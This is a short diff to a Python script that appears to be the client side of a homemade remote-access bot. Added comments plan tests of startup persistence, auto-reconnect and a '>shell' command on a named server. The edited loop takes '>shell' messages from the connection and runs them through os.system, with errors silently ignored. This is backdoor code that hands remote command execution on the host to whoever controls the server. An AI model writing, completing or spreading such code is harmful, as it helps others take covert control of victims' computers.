@@ -1,4 +1,7 @@
 # This was programmed by Feitan alone. All suggestions are welcome, (A part from the ones that ask for functions from RATs)
+# Reminder - Startup might be broken need to test on x7041 server
+# Reminder - Auto reconnect MIGHT not work need testing on x7041 server
+# Reminder - Need to test >shell command on x7041 server
 import os
 import sys
 import time
@@ -84,7 +87,8 @@ while connected is True:
 
 			if msg.lower().startswith(">shell"):
 				try:
-					shell = msg[7:]
+					length = int(len(msg))
+					shell = msg[7:length]
 					os.system(shell)
 				except:
 					pass
